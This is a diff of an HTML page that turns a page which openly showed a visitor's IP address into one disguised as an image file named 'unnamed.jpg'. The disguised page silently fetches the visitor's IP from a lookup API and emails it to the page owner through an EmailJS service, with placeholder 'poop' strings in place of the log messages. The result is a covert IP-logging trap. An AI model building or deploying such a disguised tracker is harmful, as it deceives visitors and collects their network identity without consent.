@@ -3,62 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Display Your IP Address</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-        .ip-display {
-            font-size: 24px;
-            font-weight: bold;
-            color: #4CAF50;
-        }
-        .loading {
-            font-size: 18px;
-            color: #999;
-        }
-    </style>
+    <title>unnamed.jpg</title>
+    <img src="unnamed.jpg">
 </head>
 <body>
-    <h1>Your IP Address</h1>
-    <p class="loading">Loading...</p>
-    <p class="ip-display" id="ip-address"></p>
-
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS
         emailjs.init({
 			publicKey: "dpumsvWdFgZPwi5-W",
 		});
-
-        // Use an API to fetch the IP address of the user
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                // Display the IP address on the page
-                document.querySelector('.loading').style.display = 'none';
-                document.getElementById('ip-address').textContent = data.ip;
-                
-                // Prepare the email data
                 var emailData = {
-                    ip_address: data.ip
+                    poop: data.ip
                 };
 
-                // Send the email with the IP address
                 emailjs.send('service_0ugco4i', 'template_d7pq6jg', emailData).then(
 					(response) => {
-                        console.log("Email sent successfully:", response.text);
+                        console.log("poop:", response.text);
                     },
                     (error) => {
-                        console.error("Error sending email:", error);
+                        console.error("poop:", error);
                     },
 				);
             })
             .catch(error => {
-                // Handle errors (e.g., no internet connection)
-                document.querySelector('.loading').textContent = 'Unable to fetch IP address.';
+                document.querySelector('.loading').textContent = 'poop.';
             });
     </script>
 </body>
